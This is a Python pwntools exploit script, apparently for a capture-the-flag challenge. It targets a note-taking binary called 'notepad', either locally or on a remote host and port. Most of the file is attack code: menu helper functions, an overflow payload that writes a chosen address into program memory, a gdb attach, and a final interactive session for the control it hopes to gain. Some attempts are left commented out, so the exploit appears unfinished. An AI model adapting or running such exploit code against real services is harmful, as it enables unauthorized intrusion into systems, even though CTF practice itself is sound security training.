#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '35.205.119.236', 1337
binary = './notepad'
brkpts = '''
b *0x4037ba
b *0x40324a
'''

elf = ELF("notepad")

context.arch = "amd64"
#context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)


def choice(idx):
    sla("> ", str(idx))

def add(name, data, newline = True):
    choice(1)
    sla("Name: \n", str(name)) if newline else sa("Name: \n", str(name))
    sla("Content: \n", str(data)) if newline else sa("Content: \n", str(data))

def selectnote(name):
    choice(2)
    sla("Search term: \n", str(name))

def newmenu():
    choice(3)

def oldmenu():
    choice(4)

def view():
    choice(1)

def edit(name, data):
    choice(2)
    sla("Name: \n", str(name))
    sla("Content: \n", str(data))

def lock(key, size):
    choice(3)
    sla("Key: \n", str(key))
    sla("Key size: \n", str(size))


if __name__ == "__main__":
    toal = 0x409098
    add("sourag","aaaa")
    gdb.attach(io)
    selectnote("sourag")
    for i in range(5):
        add("s"*0x10,"sss")
    payload = "\x01"*128 + p64(toal)
    newmenu()
    edit(payload,"sourag")
    edit("\x01","sourag")
    oldmenu()
    #add("s"*0x40,"s"*0x10)
    #add("s"*0x10,"sss"*0x10)
    #add("s"*0xd,"sss")
    payload = p64(0x409028) + "aaaaaaaa"
    add(payload,"sss")
    io.interactive()
